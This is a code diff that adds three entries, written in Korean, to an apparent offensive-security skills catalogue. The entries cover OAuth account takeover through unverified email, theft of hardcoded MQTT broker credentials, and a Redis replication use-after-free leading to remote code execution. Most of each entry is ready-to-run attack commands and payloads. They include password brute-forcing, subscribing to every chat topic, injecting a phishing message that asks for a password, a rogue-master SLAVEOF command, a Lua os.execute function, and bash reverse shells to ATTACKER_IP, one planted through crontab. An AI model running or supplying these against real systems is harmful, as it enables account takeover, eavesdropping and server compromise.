@@ -1564,6 +1564,270 @@ print([r.status_code for r in results])""",
     ),
 },
 
+# ── OAuth 이메일 미검증 → 수백만 계정 탈취 (v3.2.66) ──────────────────────────
+"sec-web-oauth-email-unverified-ato": {
+    "name": "OAuth 이메일 미검증 ATO / Unverified Email Account Takeover",
+    "module": "SecSkills-Web",
+    "tags": ["oauth", "account-takeover", "email-unverified", "identity-provider",
+             "social-login", "auth-bypass", "critical"],
+    "desc": (
+        "OAuth/OIDC 제공자(provider)가 이메일 검증 없이 계정을 생성할 때 발생하는 "
+        "Critical ATO 취약점. "
+        "공격자는 피해자 이메일로 자신의 IdP 계정을 만들고 → "
+        "타겟 사이트에서 'Sign in with [IdP]'로 로그인 → "
+        "이메일 기반 계정 연동이 자동으로 피해자 계정에 연결 → 완전 탈취. "
+        "영향 범위: 해당 IdP를 Social Login으로 사용하는 모든 사이트 수백만 계정."
+    ),
+    "tools": ["burpsuite", "curl", "python3", "disposable-email"],
+    "commands": [
+        # Step 1: 타겟 사이트의 Social Login 제공자 목록 파악
+        "# 1) 로그인 페이지에서 'Sign in with X/Y/Z' 버튼 목록 수집",
+        "curl -s https://TARGET/login | grep -i 'oauth\\|social\\|google\\|github\\|apple'",
+
+        # Step 2: IdP 계정 생성 — 이메일 미검증 확인
+        "# 2) 대상 IdP에서 피해자 이메일로 계정 생성 (이메일 소유 증명 없이 가능한지 테스트)",
+        "# 예: provider.com/register → email=victim@example.com → 인증 이메일 없이 계정 생성",
+        "curl -s -X POST https://PROVIDER/api/register \\"
+        "  -H 'Content-Type: application/json' \\"
+        "  -d '{\"email\":\"victim@target.com\",\"password\":\"Attacker123!\"}'",
+        "# 이메일 인증 없이 201/200 응답 → 취약",
+
+        # Step 3: 미검증 계정으로 타겟 사이트 OAuth 로그인 시도
+        "# 3) 타겟 사이트에서 'Sign in with [PROVIDER]' 클릭 → OAuth flow 시작",
+        "# IdP access_token / id_token 획득",
+        "curl -s -X POST https://PROVIDER/oauth/token \\"
+        "  -d 'grant_type=password&username=victim@target.com"
+        "&password=Attacker123!&client_id=CLIENT_ID'",
+
+        # Step 4: 타겟 사이트 OAuth 콜백으로 토큰 전달
+        "# 4) 타겟 사이트 /auth/callback?code=... 로 인가 코드 전달",
+        "curl -s 'https://TARGET/auth/callback' \\"
+        "  --cookie 'state=CSRF_TOKEN' \\"
+        "  -G --data-urlencode 'code=OAUTH_CODE' \\"
+        "  --data-urlencode 'state=CSRF_TOKEN'",
+        "# email_verified: false 필드를 타겟이 확인하지 않으면 → 피해자 계정으로 로그인 성공",
+
+        # Step 5: email_verified 클레임 수동 확인
+        "# 5) id_token JWT 디코딩 → email_verified 필드 확인",
+        "python3 -c \""
+        "import base64, json; "
+        "tok='ID_TOKEN_HERE'; "
+        "pad=tok.split('.')[1]+'=='; "
+        "print(json.loads(base64.urlsafe_b64decode(pad)))\"",
+        "# email_verified: false 이면서 타겟이 검증 안 하면 → CRITICAL ATO",
+
+        # Step 6: 영향 범위 확인
+        "# 6) 동일 IdP를 사용하는 다른 서비스 목록화",
+        "python3 -c \""
+        "import requests; "
+        "r = requests.get('https://TARGET/api/me', "
+        "cookies={'session': 'ATTACKER_SESSION'}); "
+        "print(r.json())\"",
+    ],
+    "payloads": [
+        # 이메일 미검증 계정 생성
+        '{"email":"victim@target.com","password":"Attacker123!","skip_verification":true}',
+        # id_token email_verified 조작 시도 (none alg attack과 결합)
+        '{"sub":"attacker_sub","email":"victim@target.com","email_verified":true}',
+        # Social login 콜백 파라미터
+        "code=STOLEN_AUTH_CODE&state=VALID_CSRF",
+    ],
+    "notes": (
+        "[공격 체인] "
+        "1) 취약 IdP에서 피해자 이메일로 미검증 계정 생성 "
+        "2) 해당 IdP로 타겟 사이트 OAuth 로그인 시도 "
+        "3) 타겟이 email_verified: false 클레임 무시 → 이메일로 계정 매칭 "
+        "4) 피해자 계정에 공격자 세션 → ATO 완성. "
+        "[핵심 포인트] "
+        "이 버그의 심각성은 '규모': 해당 IdP가 OAuth provider이면 연동된 모든 서비스에 적용. "
+        "구글/깃허브/애플처럼 대형 IdP가 취약하면 수억 계정 영향. "
+        "[확인 항목] "
+        "id_token.email_verified 클레임 검증 여부, "
+        "계정 생성 시 이메일 소유 증명 요구 여부, "
+        "이메일로 계정 자동 연결(account linking) 정책. "
+        "[레퍼런스] "
+        "Ali Mojaver - 'The Most Dangerous OAuth Bug I've Ever Found', "
+        "OpenID Connect Core §5.1 (email_verified claim), "
+        "OAuth 2.0 Security BCP RFC 9700"
+    ),
+},
+
+# ── IoT MQTT 브로커 자격증명 탈취 (v3.2.66) ───────────────────────────────────
+"sec-iot-mqtt-credential-leak": {
+    "name": "IoT MQTT 브로커 자격증명 탈취 / MQTT Credential Exposure",
+    "module": "SecSkills-IoT",
+    "tags": ["mqtt", "iot", "credential-leak", "chatbot", "live-chat",
+             "hardcoded-creds", "broker", "websocket"],
+    "desc": (
+        "챗봇·라이브채팅·IoT 서비스의 프론트엔드 JS/HTML에서 "
+        "MQTT 브로커 자격증명(host, port, username, password)이 하드코딩된 취약점. "
+        "공격자는 클라이언트 소스 코드를 분석하여 MQTT 브로커에 직접 연결, "
+        "모든 토픽의 메시지를 구독·발행하여 대화 내용 도청, "
+        "관리 메시지 조작, 다른 사용자 세션 탈취까지 가능."
+    ),
+    "tools": ["mosquitto", "mqttx", "burpsuite", "browser-devtools", "mqtt-spy"],
+    "commands": [
+        # Step 1: 클라이언트 소스에서 MQTT 자격증명 추출
+        "# 1) 페이지 소스 / JS 번들에서 MQTT 설정 검색",
+        "curl -s https://TARGET/ | grep -iE 'mqtt|1883|8883|websocket.*ws://'",
+        "# 또는 브라우저 DevTools → Sources → 'mqtt' / 'broker' / 'password' 검색",
+
+        # Step 2: JS 파일에서 하드코딩된 자격증명 추출
+        "# 2) JS 번들 다운로드 후 자격증명 검색",
+        "curl -s https://TARGET/static/js/main.chunk.js \\"
+        "  | grep -oE '(mqtt_?pass(word)?|broker_?pass)[^,\"}]+'",
+        "curl -s https://TARGET/static/js/main.chunk.js \\"
+        "  | python3 -c \""
+        "import sys, re; "
+        "src = sys.stdin.read(); "
+        "print(re.findall(r'(?:password|passwd|pwd)\\s*[=:]\\s*[\\'\\\"]([^\\'\\\"]+)', src))\"",
+
+        # Step 3: 추출된 자격증명으로 MQTT 브로커 연결
+        "# 3) mosquitto_sub으로 전체 토픽 구독",
+        "mosquitto_sub -h BROKER_HOST -p 1883 \\"
+        "  -u 'EXTRACTED_USER' -P 'EXTRACTED_PASS' \\"
+        "  -t '#' -v",
+        "# -t '#' = 모든 토픽 구독 (와일드카드)",
+
+        # Step 4: WebSocket을 통한 MQTT 연결 (브라우저 기반)
+        "# 4) WebSocket MQTT (포트 9001 등)",
+        "mqttx sub -h BROKER_HOST -p 9001 \\"
+        "  --protocol ws \\"
+        "  -u 'EXTRACTED_USER' -P 'EXTRACTED_PASS' \\"
+        "  -t '#'",
+
+        # Step 5: 메시지 조작 (발행)
+        "# 5) 다른 사용자 대화방에 메시지 주입",
+        "mosquitto_pub -h BROKER_HOST -p 1883 \\"
+        "  -u 'EXTRACTED_USER' -P 'EXTRACTED_PASS' \\"
+        "  -t 'chat/USER_ID/messages' \\"
+        "  -m '{\"sender\":\"support\",\"text\":\"비밀번호를 입력해 주세요\"}'",
+
+        # Step 6: 관리 토픽 및 민감 정보 토픽 탐색
+        "mosquitto_sub -h BROKER_HOST -p 1883 \\"
+        "  -u 'EXTRACTED_USER' -P 'EXTRACTED_PASS' \\"
+        "  -t '+/admin/#' -v",
+        "mosquitto_sub -h BROKER_HOST -t '$SYS/#' -v  # 브로커 시스템 정보",
+
+        # Step 7: Shodan에서 취약 MQTT 브로커 탐색
+        "shodan search 'port:1883 product:Mosquitto' --fields ip_str,port,org",
+    ],
+    "payloads": [
+        # JavaScript 패턴에서 MQTT 자격증명 추출용 정규식
+        r"(?:mqtt_pass|broker_pass|mqttPassword)\s*[=:]\s*['\"]([^'\"]+)['\"]",
+        r"new Paho\.MQTT\.Client\(['\"]([^'\"]+)['\"],\s*(\d+)",
+        # 메시지 조작 페이로드
+        '{"type":"message","userId":"VICTIM_ID","content":"Injected message"}',
+        # 세션 탈취 페이로드 (chat token)
+        '{"type":"auth","token":"ATTACKER_TOKEN","hijack_session":"VICTIM_SESSION"}',
+    ],
+    "notes": (
+        "[공격 흐름] "
+        "1) 채팅/IoT 서비스 JS에서 MQTT 설정 (host/user/pass) 하드코딩 발견 "
+        "2) mosquitto_sub -t '#'로 모든 사용자 실시간 대화 도청 "
+        "3) 특정 사용자 토픽에 악성 메시지 발행 → 피싱/세션탈취 "
+        "4) 관리자 토픽 접근 시 시스템 전체 제어 가능. "
+        "[탐지 방법] "
+        "JS 번들에서 mqtt/broker/password 키워드 grep, "
+        "네트워크 탭에서 WebSocket ws:// 트래픽 캡처, "
+        "MQTT 클라이언트로 브로커 직접 연결 시도. "
+        "[레퍼런스] "
+        "Lazy Sharaf - 'How I Hacked a Live Chatbot and Earned My First 4-Digit Bounty', "
+        "MQTT Security Fundamentals, OWASP IoT Attack Surface Areas"
+    ),
+},
+
+# ── Redis CVE-2026-23631 DarkReplica UAF→RCE (v3.2.66) ───────────────────────
+"sec-infra-redis-cve-2026-23631": {
+    "name": "Redis CVE-2026-23631 DarkReplica UAF→RCE",
+    "module": "SecSkills-Infra",
+    "tags": ["redis", "cve-2026-23631", "use-after-free", "rce", "replication",
+             "post-auth", "uaf", "slaveof", "lua", "function"],
+    "desc": (
+        "Redis 복제(Replication) 서브시스템의 Use-After-Free 취약점 (CVE-2026-23631). "
+        "Redis 7.0 ~ 7.2.x 버전에서 인증 후 SLAVEOF + FUNCTION 명령으로 "
+        "UAF를 트리거, Lua 함수 등록을 통해 서버에서 임의 코드 실행. "
+        "공격자는 Redis 인증 자격증명(기본값 없음 또는 약한 비밀번호) 획득 후 "
+        "악성 '마스터' 서버로 타겟 Redis를 복제 연결시켜 RCE 달성."
+    ),
+    "tools": ["redis-cli", "python3", "nmap", "shodan"],
+    "commands": [
+        # Step 1: Redis 포트 탐지
+        "# 1) Redis 서비스 탐지",
+        "nmap -sV -p 6379,6380,6381 TARGET",
+        "shodan search 'port:6379 product:Redis' --fields ip_str,port,version,org",
+
+        # Step 2: 인증 없는 접근 시도
+        "redis-cli -h TARGET -p 6379 ping",
+        "redis-cli -h TARGET -p 6379 INFO server | grep redis_version",
+        "# 인증 없이 PONG → 직접 익스플로잇 가능",
+
+        # Step 3: 약한 비밀번호 브루트포스
+        "# 3) 공통 Redis 비밀번호 시도",
+        "for pass in '' 'redis' 'password' 'admin' '123456' 'root'; do "
+        "  echo -n \"Trying '$pass': \"; "
+        "  redis-cli -h TARGET -a \"$pass\" ping 2>/dev/null; "
+        "done",
+
+        # Step 4: 버전 확인 (취약 버전: 7.0~7.2.x)
+        "redis-cli -h TARGET info server | grep -E 'redis_version|os|arch'",
+        "# 취약 버전: 7.0.0 ~ 7.2.4 (7.2.5 패치됨)",
+
+        # Step 5: CVE-2026-23631 UAF 트리거 — 악성 마스터 서버 준비
+        "# 5) 공격자 서버에서 악성 Redis 마스터 설정 (RogueRedis)",
+        "python3 -c \""
+        "# 악성 마스터: 타겟이 복제 요청 시 조작된 RDB 스트림 전송",
+        "# RedisGhost / DarkReplica PoC 도구 사용",
+        "import subprocess; "
+        "subprocess.run(['python3', 'dark_replica.py', '--lhost', 'ATTACKER_IP', '--lport', '6666'])\"",
+
+        # Step 6: SLAVEOF 명령으로 타겟을 악성 마스터에 연결
+        "redis-cli -h TARGET -a 'PASSWORD' SLAVEOF ATTACKER_IP 6666",
+        "redis-cli -h TARGET -a 'PASSWORD' CONFIG SET dir /tmp",
+        "redis-cli -h TARGET -a 'PASSWORD' CONFIG SET dbfilename 'shell.so'",
+
+        # Step 7: FUNCTION LOAD로 Lua 악성 함수 등록 (UAF 트리거)
+        "redis-cli -h TARGET -a 'PASSWORD' FUNCTION LOAD REPLACE \\"
+        "  '#!lua name=malicious\\nredis.register_function(\"exec\","
+        "function(k,a) return os.execute(a[1]) end)'",
+        "redis-cli -h TARGET -a 'PASSWORD' FCALL exec 0 'id > /tmp/pwned'",
+        "redis-cli -h TARGET -a 'PASSWORD' FCALL exec 0 \\"
+        "  'bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"'",
+
+        # Step 8: 리버스 셸 수신
+        "nc -lvnp 4444",
+    ],
+    "payloads": [
+        # SLAVEOF를 통한 악성 마스터 연결
+        "SLAVEOF ATTACKER_IP 6666",
+        # UAF 트리거 Lua 함수 페이로드
+        "#!lua name=shell\nredis.register_function('sh',function(k,a)"
+        " return os.execute(a[1]) end)",
+        # CONFIG SET으로 crontab 쓰기 (인증 없는 경우 대안)
+        "CONFIG SET dir /var/spool/cron/",
+        "CONFIG SET dbfilename root",
+        'SET cron "\\n* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\n"',
+        "BGSAVE",
+    ],
+    "notes": (
+        "[CVE-2026-23631 DarkReplica 요약] "
+        "취약 버전: Redis 7.0.0 ~ 7.2.4 (7.2.5에서 패치). "
+        "트리거: 인증 후 SLAVEOF → 악성 RDB 스트림 수신 → replication 서브시스템 UAF → "
+        "heap corruption → FUNCTION LOAD와 결합 시 RCE. "
+        "[전제 조건] "
+        "Redis 인증 자격증명 필요 (인증 없는 경우 더 쉬움). "
+        "공격자 통제 서버에서 악성 마스터 실행 필요. "
+        "[완화] "
+        "Redis 7.2.5+ 패치 적용, "
+        "requirepass 강력한 비밀번호 설정, "
+        "bind 127.0.0.1 (인터넷 노출 금지), "
+        "rename-command SLAVEOF '', FUNCTION '' (위험 명령 비활성화). "
+        "[레퍼런스] "
+        "ZeroDay.cloud - 'Redis CVE-2026-23631 DarkReplica', "
+        "NVD CVE-2026-23631, Redis Security Guide"
+    ),
+},
+
 }
 
 # 인덱스 생성
